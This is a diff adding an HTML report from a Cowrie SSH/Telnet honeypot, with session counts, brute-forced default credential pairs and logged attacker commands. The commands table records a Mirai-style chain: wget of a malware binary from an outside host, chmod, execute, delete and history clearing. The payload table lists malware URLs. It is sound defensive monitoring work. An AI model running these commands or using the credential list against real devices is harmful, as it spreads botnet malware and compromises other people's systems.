@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Honeypot report</title>
+<style>
+  :root {
+    color-scheme: light dark;
+    --bg: #fbfbfa; --fg: #1a1a1a; --muted: #6b7280; --card: #fff;
+    --line: #e5e7eb; --bar: #2563eb; --accent: #b91c1c;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root { --bg: #0f1115; --fg: #e6e6e6; --muted: #9aa0a6; --card: #171a21;
+            --line: #262b36; --bar: #3b82f6; --accent: #f87171; }
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--fg);
+         font: 15px/1.55 ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, sans-serif; }
+  main { max-width: 960px; margin: 0 auto; padding: 2rem 1.25rem 4rem; }
+  h1 { margin: 0 0 .25rem; font-size: 1.6rem; }
+  h2 { margin: 2.5rem 0 .75rem; font-size: 1.15rem; }
+  .muted { color: var(--muted); }
+  .sub { color: var(--muted); margin: 0 0 2rem; }
+  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: .75rem; }
+  .stat { background: var(--card); border: 1px solid var(--line); border-radius: 10px; padding: .9rem 1rem; }
+  .stat b { display: block; font-size: 1.5rem; }
+  .stat span { color: var(--muted); font-size: .85rem; }
+  .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem 2.5rem; }
+  @media (max-width: 720px) { .cols { grid-template-columns: 1fr; } }
+  .bars { width: 100%; height: auto; }
+  .bars rect { fill: var(--bar); }
+  .bars .lbl { fill: var(--fg); font-size: 12px; }
+  .bars .val { fill: var(--muted); font-size: 11px; }
+  table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+  th, td { text-align: left; padding: .35rem .6rem; border-bottom: 1px solid var(--line); }
+  th { color: var(--muted); font-weight: 600; }
+  code { background: color-mix(in srgb, var(--fg) 8%, transparent); padding: .05rem .3rem; border-radius: 4px; }
+  .scroll { overflow-x: auto; }
+  footer { margin-top: 3rem; color: var(--muted); font-size: .85rem; }
+</style>
+</head>
+<body>
+<main>
+  <h1>SSH / Telnet honeypot report</h1>
+  <p class="sub">
+    2026-08-12 &rarr; 2026-08-16 &middot; generated 2026-09-04 06:43 UTC &middot;
+    <a href="https://github.com/justinmreynolds93-afk/honeypot-pipeline">source</a>
+  </p>
+
+  <div class="grid">
+    <div class="stat"><b>60</b><span>sessions</span></div>
+    <div class="stat"><b>9</b><span>distinct source IPs</span></div>
+    <div class="stat"><b>209</b><span>login attempts</span></div>
+    <div class="stat"><b>98</b><span>shell commands</span></div>
+    <div class="stat"><b>9</b><span>payloads pulled</span></div>
+  </div>
+
+  <div class="cols">
+    <div>
+      <h2>Top source IPs</h2>
+      <svg viewBox='0 0 420 252' role='img' class='bars'><text x='0' y='15' class='lbl'>203.0.113.44 (??)</text><rect x='150' y='0' width='250' height='22' rx='3'/><text x='408' y='15' class='val'>11</text><text x='0' y='43' class='lbl'>198.51.100.140 (??)</text><rect x='150' y='28' width='250' height='22' rx='3'/><text x='408' y='43' class='val'>11</text><text x='0' y='71' class='lbl'>192.0.2.77 (??)</text><rect x='150' y='56' width='181' height='22' rx='3'/><text x='339' y='71' class='val'>8</text><text x='0' y='99' class='lbl'>198.51.100.23 (??)</text><rect x='150' y='84' width='181' height='22' rx='3'/><text x='339' y='99' class='val'>8</text><text x='0' y='127' class='lbl'>192.0.2.15 (??)</text><rect x='150' y='112' width='181' height='22' rx='3'/><text x='339' y='127' class='val'>8</text><text x='0' y='155' class='lbl'>192.0.2.200 (??)</text><rect x='150' y='140' width='113' height='22' rx='3'/><text x='271' y='155' class='val'>5</text><text x='0' y='183' class='lbl'>198.51.100.87 (??)</text><rect x='150' y='168' width='90' height='22' rx='3'/><text x='248' y='183' class='val'>4</text><text x='0' y='211' class='lbl'>203.0.113.201 (??)</text><rect x='150' y='196' width='68' height='22' rx='3'/><text x='226' y='211' class='val'>3</text><text x='0' y='239' class='lbl'>203.0.113.9 (??)</text><rect x='150' y='224' width='45' height='22' rx='3'/><text x='203' y='239' class='val'>2</text></svg>
+    </div>
+    <div>
+      <h2>Origin countries (by IP)</h2>
+      <svg viewBox='0 0 420 28' role='img' class='bars'><text x='0' y='15' class='lbl'>unknown</text><rect x='150' y='0' width='250' height='22' rx='3'/><text x='408' y='15' class='val'>9</text></svg>
+    </div>
+    <div>
+      <h2>Usernames tried</h2>
+      <svg viewBox='0 0 420 196' role='img' class='bars'><text x='0' y='15' class='lbl'>root</text><rect x='150' y='0' width='250' height='22' rx='3'/><text x='408' y='15' class='val'>115</text><text x='0' y='43' class='lbl'>admin</text><rect x='150' y='28' width='93' height='22' rx='3'/><text x='251' y='43' class='val'>43</text><text x='0' y='71' class='lbl'>pi</text><rect x='150' y='56' width='26' height='22' rx='3'/><text x='184' y='71' class='val'>12</text><text x='0' y='99' class='lbl'>ubnt</text><rect x='150' y='84' width='26' height='22' rx='3'/><text x='184' y='99' class='val'>12</text><text x='0' y='127' class='lbl'>user</text><rect x='150' y='112' width='21' height='22' rx='3'/><text x='179' y='127' class='val'>10</text><text x='0' y='155' class='lbl'>Administrator</text><rect x='150' y='140' width='19' height='22' rx='3'/><text x='177' y='155' class='val'>9</text><text x='0' y='183' class='lbl'>support</text><rect x='150' y='168' width='17' height='22' rx='3'/><text x='175' y='183' class='val'>8</text></svg>
+    </div>
+    <div>
+      <h2>Passwords tried</h2>
+      <svg viewBox='0 0 420 336' role='img' class='bars'><text x='0' y='15' class='lbl'>admin</text><rect x='150' y='0' width='250' height='22' rx='3'/><text x='408' y='15' class='val'>26</text><text x='0' y='43' class='lbl'>1234</text><rect x='150' y='28' width='192' height='22' rx='3'/><text x='350' y='43' class='val'>20</text><text x='0' y='71' class='lbl'>password</text><rect x='150' y='56' width='125' height='22' rx='3'/><text x='283' y='71' class='val'>13</text><text x='0' y='99' class='lbl'>smcadmin</text><rect x='150' y='84' width='115' height='22' rx='3'/><text x='273' y='99' class='val'>12</text><text x='0' y='127' class='lbl'>ubnt</text><rect x='150' y='112' width='115' height='22' rx='3'/><text x='273' y='127' class='val'>12</text><text x='0' y='155' class='lbl'>raspberry</text><rect x='150' y='140' width='115' height='22' rx='3'/><text x='273' y='155' class='val'>12</text><text x='0' y='183' class='lbl'>54321</text><rect x='150' y='168' width='96' height='22' rx='3'/><text x='254' y='183' class='val'>10</text><text x='0' y='211' class='lbl'>user</text><rect x='150' y='196' width='96' height='22' rx='3'/><text x='254' y='211' class='val'>10</text><text x='0' y='239' class='lbl'></text><rect x='150' y='224' width='96' height='22' rx='3'/><text x='254' y='239' class='val'>10</text><text x='0' y='267' class='lbl'>vizxv</text><rect x='150' y='252' width='86' height='22' rx='3'/><text x='244' y='267' class='val'>9</text><text x='0' y='295' class='lbl'>1111</text><rect x='150' y='280' width='86' height='22' rx='3'/><text x='244' y='295' class='val'>9</text><text x='0' y='323' class='lbl'>support</text><rect x='150' y='308' width='76' height='22' rx='3'/><text x='234' y='323' class='val'>8</text></svg>
+    </div>
+  </div>
+
+  <h2>Most-attempted credential pairs</h2>
+  <div class="scroll"><table>
+    <tr><th>username / password</th><th>attempts</th></tr>
+    <tr><td><code>admin / password</code></td><td>13</td></tr><tr><td><code>pi / raspberry</code></td><td>12</td></tr><tr><td><code>ubnt / ubnt</code></td><td>12</td></tr><tr><td><code>admin / smcadmin</code></td><td>12</td></tr><tr><td><code>admin / 1234</code></td><td>11</td></tr><tr><td><code>root / admin</code></td><td>10</td></tr><tr><td><code>root / </code></td><td>10</td></tr><tr><td><code>user / user</code></td><td>10</td></tr><tr><td><code>root / 54321</code></td><td>10</td></tr><tr><td><code>root / 1111</code></td><td>9</td></tr><tr><td><code>Administrator / admin</code></td><td>9</td></tr><tr><td><code>root / vizxv</code></td><td>9</td></tr>
+  </table></div>
+
+  <h2>Most-run commands</h2>
+  <div class="scroll"><table>
+    <tr><th>command</th><th>count</th></tr>
+    <tr><td><code>/bin/busybox MIRAI</code></td><td>14</td></tr><tr><td><code>cat /proc/mounts</code></td><td>14</td></tr><tr><td><code>cat /proc/cpuinfo | grep name | head -n 1</code></td><td>14</td></tr><tr><td><code>uname -a</code></td><td>14</td></tr><tr><td><code>free -m</code></td><td>11</td></tr><tr><td><code>wget http://198.51.100.250/bins/mirai.x86 -O /tmp/.x</code></td><td>9</td></tr><tr><td><code>chmod +x /tmp/.x</code></td><td>8</td></tr><tr><td><code>/tmp/.x</code></td><td>7</td></tr><tr><td><code>rm -rf /tmp/.x</code></td><td>5</td></tr><tr><td><code>history -c</code></td><td>2</td></tr>
+  </table></div>
+
+  <h2>Payloads downloaded</h2>
+  <div class="scroll"><table>
+    <tr><th>url</th><th>sha256</th><th>count</th></tr>
+    <tr><td><code>http://203.0.113.201/a/kaiten.arm7</code></td><td><code>9f2e5c8b1a4d7e0c</code></td><td>6</td></tr><tr><td><code>http://198.51.100.250/bins/mirai.x86</code></td><td><code>3b1c6f2e9a7d4b8c</code></td><td>3</td></tr>
+  </table></div>
+
+  <h2>SSH client strings</h2>
+  <div class="scroll"><table>
+    <tr><th>client</th><th>sessions</th></tr>
+    <tr><td><code>SSH-2.0-Go</code></td><td>18</td></tr><tr><td><code>SSH-2.0-PUTTY</code></td><td>13</td></tr><tr><td><code>SSH-2.0-libssh2_1.9.0</code></td><td>11</td></tr><tr><td><code>SSH-2.0-paramiko_2.7.2</code></td><td>10</td></tr><tr><td><code>SSH-2.0-libssh2_1.10.0</code></td><td>8</td></tr>
+  </table></div>
+
+  <footer>
+    <a href="../data/blocklist.txt">blocklist.txt</a> &middot;
+    <a href="../data/credentials.csv">credentials.csv</a> &middot;
+    <a href="../THREATS.md">THREATS.md</a><br>
+    Cowrie low-interaction honeypot. Emulated shell in a jail; attacker commands
+    are not executed on a real system.
+  </footer>
+</main>
+</body>
+</html>
